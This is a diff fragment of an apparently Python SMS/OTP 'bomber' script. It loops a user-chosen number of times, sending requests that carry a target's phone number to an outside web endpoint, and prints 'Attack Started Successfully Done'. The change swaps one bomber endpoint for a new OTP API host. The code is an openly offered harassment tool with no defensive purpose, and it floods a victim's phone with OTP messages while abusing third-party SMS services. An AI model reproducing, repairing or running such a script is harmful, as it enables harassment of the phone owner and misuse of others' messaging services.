@@ -56,7 +56,7 @@ amount=int(input("Enter Amount :"))
 sent=0
 while sent<amount:
     
-   a=requests.get("https://bj-x-coder.top/bo_m_ber.php?phone="+namber)                                                                                      
+   a=requests.get("https://md-hasib.is-great.org/complete otp-api.php?number="+namber)                                                                                      
  
    print("Attack Started Successfully Done👿👻")
 pass
